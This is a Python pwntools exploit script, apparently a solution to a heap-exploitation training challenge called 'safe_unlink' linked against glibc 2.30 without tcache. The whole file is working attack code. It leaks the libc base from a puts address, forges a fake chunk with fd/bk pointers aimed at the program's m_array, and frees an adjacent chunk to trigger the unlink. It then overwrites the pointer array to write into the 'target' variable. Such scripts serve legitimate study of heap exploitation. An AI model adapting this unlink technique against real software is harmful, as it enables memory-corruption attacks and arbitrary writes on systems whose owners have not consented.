#!/usr/bin/env python3
from pwn import *



context.log_level = 'debug'
context.binary = elf = ELF('./safe_unlink', checksec=False)

libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6', checksec=False)
#libc = elf.libc

gs = """
b *main
b *main+218
b *main+326
b *main+606
b *main+735
"""

index = 0

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1

def edit(index, data):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')
    
def free(index):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def target():
    io.send(b'4')
    io.recvuntil(b'> ')
    
def quit():
    io.send(b'5')
 

io = start()

io.recvuntil(b'puts() @ ')
puts = int(io.recvline(), 16)
libc.address = puts - libc.sym['puts']
info("libc base: " + hex(libc.address))

io.recvuntil(b'> ')

chunk_a = malloc(0x88)
chunk_b = malloc(0x88)

chunk_prev = p64(0)
chunk_size = p64(0x80)
fd = p64(elf.sym['m_array'] - 0x18)
bk = p64(elf.sym['m_array'] - 0x10)
nop = p8(0)*(0x88 - 8*5)
fake_prev_size = p64(0x80)
fake_size = p64(0x90)

payload = chunk_prev + chunk_size + fd + bk + nop + fake_prev_size + fake_size

edit(0, payload)
free(chunk_b)

overlapped_mparray = p64(0)*3 + p64(elf.sym['target'])
edit(0, overlapped_mparray)
edit(0, b'Much win')
target()


io.interactive()
